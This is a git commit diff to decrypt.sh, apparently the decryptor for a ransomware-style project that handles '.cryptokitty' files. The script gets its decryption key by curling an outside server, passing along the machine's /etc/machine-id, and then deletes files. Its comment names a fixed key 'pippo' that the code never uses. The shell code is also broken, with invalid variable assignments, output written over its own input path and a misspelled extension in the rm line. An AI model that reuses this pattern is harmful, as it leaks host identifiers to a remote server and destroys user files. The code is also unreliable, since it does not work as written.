f0954099dce841444ef827aba91937639fca72ae
Solomon Marian <blasco991@gmail.com>
2018-07-07 13:46:38 +0200

    Update decrypt.sh

--- decrypt.sh
+++ decrypt.sh
@@ -1,7 +1,7 @@
 #file in the first argument
-if [[ "${f##*\\.}" == "*.cryptokitty" ]] then
-$f = ${$1%.cryptokitty}
-echo $f 
-#i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
-[ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out ${f%.cryptokitty} ; rm $f
+if [[ $1 =~ \.cryptokitty$ ]]; then
+  f = $1 && f = ${f%.cryptokitty}
+  echo $f 
+  #i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
+  [ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out "$f" && rm "$f.cryptkitty"
 fi
